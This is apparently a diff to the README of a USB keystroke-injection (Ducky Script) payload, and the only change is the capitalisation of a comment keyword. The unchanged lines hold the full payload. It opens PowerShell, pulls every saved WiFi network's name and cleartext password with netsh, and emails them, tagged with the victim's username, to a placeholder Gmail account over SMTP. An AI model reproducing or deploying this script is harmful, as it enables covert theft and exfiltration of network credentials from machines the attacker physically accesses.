@@ -17,7 +17,7 @@ DELAY 500
 REM --------> Open Powershell straight away, allows us to type the command out as its queueing. Close when Powershell exits.
 STRING cmd /c powershell && exit
 DELAY 500
-Rem --------> Long-ass command. Gets the SSID and password off each saved WiFi network, formats a bit, sends it to YOUREMAIL@gmail.com, through the account of YOUREMAIL@gmail.com
+REM --------> Long-ass command. Gets the SSID and password off each saved WiFi network, formats a bit, sends it to YOUREMAIL@gmail.com, through the account of YOUREMAIL@gmail.com
 STRING $a=0;ForEach($b in ((netsh wlan show profile|findstr "All User Profile") -match "All User Profile").split(":")){if($a -eq "1") {(netsh wlan show profile $b.substring(1) Key=clear|findstr /I "SSID Content"|findstr /V "SSIDs") -replace "[^`"]$","`r`n">>a;$a++}else{$a=1}};$c=New-Object Net.Mail.SmtpClient("smtp.gmail.com",587);$c.EnableSsl=$true;$c.Credentials=New-Object System.Net.NetworkCredential("YOUREMAIL@gmail.com","YOURPASSWORD");$d=New-Object System.Net.Mail.MailMessage;$d.From="YOUREMAIL@gmail.com";$d.To.Add("YOUREMAIL@gmail.com");$d.Subject=($env:UserName+"@"+$env:UserDomain);$d.Body=(Get-Content a|out-string);$c.Send($d);Remove-Item a;exit
 ```
 ### Suggestions
